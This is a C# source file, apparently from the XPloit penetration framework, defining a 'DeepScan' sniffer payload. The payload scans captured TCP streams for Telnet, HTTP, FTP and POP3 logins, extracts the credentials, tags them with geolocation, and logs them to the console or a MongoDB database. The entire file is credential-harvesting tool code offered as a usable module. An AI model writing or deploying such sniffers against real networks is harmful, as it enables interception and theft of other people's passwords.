using MongoDB.Driver;
using PacketDotNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Dynamic;
using XPloit.Core;
using XPloit.Core.Attributes;
using XPloit.Core.Mongo;
using XPloit.Helpers.Attributes;
using XPloit.Helpers.Geolocate;
using XPloit.Sniffer.Enums;
using XPloit.Sniffer.Extractors;
using XPloit.Sniffer.Interfaces;
using XPloit.Sniffer.Streams;

namespace Payloads.Local.Sniffer
{
    [ModuleInfo(Author = "Fernando Díaz Toledano", Description = "Sniffer insecure protocols passwords")]
    public class DeepScan : Payload, Auxiliary.Local.Sniffer.IPayloadSniffer
    {
        #region Properties
        public bool CaptureOnTcpStream { get { return true; } }
        public bool CaptureOnPacket { get { return false; } }

        [ConfigurableProperty(Description = "Mongo repository url", Optional = true)]
        public XploitMongoRepository<Credential> Repository { get; set; }

        [ConfigurableProperty(Description = "Write credentials as info")]
        public bool WriteAsInfo { get; set; }


        [ConfigurableProperty(Description = "Search for credencials")]
        public bool SearchCredentials { get; set; }
        [ConfigurableProperty(Description = "Search for attacks")]
        public bool SearchAttacks { get; set; }
        #endregion

        long hay = 0;
        Dictionary<Credential.ECredentialType, string> _LastCred = new Dictionary<Credential.ECredentialType, string>();
        IObjectExtractor[] _Checks = new IObjectExtractor[] { ExtractTelnet.Current, ExtractHttp.Current, ExtractFtpPop3.Current };

        public DeepScan()
        {
            SearchCredentials = true;
            SearchAttacks = true;
        }

        public void Stop(object sender)
        {
            WriteInfo("Stream captured", hay.ToString(), ConsoleColor.Cyan);
        }
        public bool Check()
        {
            if (Repository != null) Repository.Check();

            hay = 0;
            return true;
        }
        public void OnPacket(object sender, IPProtocolType protocolType, EthernetPacket packet) { }
        public void OnTcpStream(object sender, TcpStream stream, bool isNew, ConcurrentQueue<object> queue)
        {
            if (isNew) hay++;
            if (stream == null || stream.Count == 0) return;

            if (stream.Variables == null)
            {
                stream.Variables = new ExpandoObject();
                stream.Variables.Valid = new bool[] { true, true, true };
            }

            // Check
            bool some = false;
            try
            {
                for (int x = stream.Variables.Valid.Length - 1; x >= 0; x--)
                {
                    if (!stream.Variables.Valid[x]) continue;

                    object[] cred;
                    switch (_Checks[x].GetObjects(stream, out cred))
                    {
                        case EExtractorReturn.DontRetry:
                            {
                                stream.Variables.Valid[x] = false;
                                break;
                            }
                        case EExtractorReturn.Retry: some = true; break;
                        case EExtractorReturn.True:
                            {
                                stream.Dispose();

                                foreach (object c in cred)
                                    if (c != null)
                                    {
                                        if (c is Attack && !SearchAttacks) continue;
                                        if (c is Credential && !SearchCredentials) continue;

                                        queue.Enqueue(c);
                                    }

                                return;
                            }
                    }
                }
            }
            catch (Exception e)
            {
                WriteError(e.ToString());
            }

            if (!some)
                stream.Dispose();
        }
        public void Dequeue(object sender, object o)
        {
            ICountryRecaller ic;

            if (o is ICountryRecaller)
            {
                ic = (ICountryRecaller)o;
                ic.RecallCounty(GeoLite2LocationProvider.Current);
            }
            else return;

            // Console
            if (WriteAsInfo)
            {
                string json = o.ToString();

                if (!(o is Credential) || ((Credential)o).IsValid) WriteInfo(json);
                else WriteError(json);
            }

            // Repository
            if (Repository != null && ic != null)
            {
                // Split repositories by type
                IMongoCollection<ICountryRecaller> col =
                    Repository.Database.GetCollection<ICountryRecaller>(o.GetType().Name);

                col.InsertOneAsync(ic);
            }
        }
    }
}